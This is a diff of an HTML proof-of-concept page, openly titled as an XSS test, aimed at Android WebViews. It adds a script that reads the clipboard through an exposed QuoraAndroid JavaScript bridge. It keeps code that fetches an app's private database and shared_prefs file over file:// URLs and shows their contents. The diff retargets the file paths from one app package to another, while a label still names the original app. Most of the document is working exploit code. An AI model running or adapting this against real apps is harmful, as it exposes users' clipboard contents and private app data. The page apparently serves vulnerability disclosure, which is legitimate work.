@@ -1,9 +1,11 @@
 <html><head><title>XSS</title></head>
 <body style="font-size:20px;font-family:monospace;background:#ffffcc;margin:8px">
 <div id="o">XSS PoC page</div>
+  <script>alert(QuoraAndroid.getClipboardData());</script>
 <script>
 /* canonical XSS proof-of-concept */
 alert(1);
+  
 
 /* after you press OK, the second dialog shows what the page could reach */
 function grab(p){
@@ -15,8 +17,8 @@ function grab(p){
     return x.responseText;
   } catch (e) { return null; }
 }
-var db = grab('file:///data/data/com.vcs.ecubixecp/databases/ecp_mobile');
-var pf = grab('file:///data/data/com.vcs.ecubixecp/shared_prefs/ECP.xml');
+var db = grab('file:///data/data/dk.royalarena.app/databases/ecp_mobile');
+var pf = grab('file:///data/data/dk.royalarena.app/shared_prefs/ECP.xml');
 var m = "Ecubix WebView, file:// origin\n\n";
 m += db ? "private DB  ecp_mobile = " + db.length + " bytes\n  " + db.substring(0,15) + "\n\n"
         : "private DB  blocked\n\n";
